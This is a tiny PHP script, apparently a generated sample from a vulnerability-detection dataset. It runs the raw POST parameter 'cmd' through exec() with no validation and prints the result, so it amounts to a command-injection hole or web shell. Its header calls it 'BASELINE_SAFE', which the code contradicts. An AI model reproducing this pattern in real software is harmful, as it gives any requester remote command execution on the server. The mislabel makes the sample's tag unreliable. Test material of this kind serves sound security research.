<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=BODY_POST; CE_MODE=POST_LOCAL_COPY; SKELETON=S3; KEY=cmd; SINK=B2; VAR=v0161 */
function SINK_B2($command){
    $output = [];
    exec($command, $output);
    print_r($output);
}
$p = $_POST;
$inp = (string)($p["cmd"] ?? "");
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B2($x);
};
$out = $f($inp);
echo (string)($out);
?>
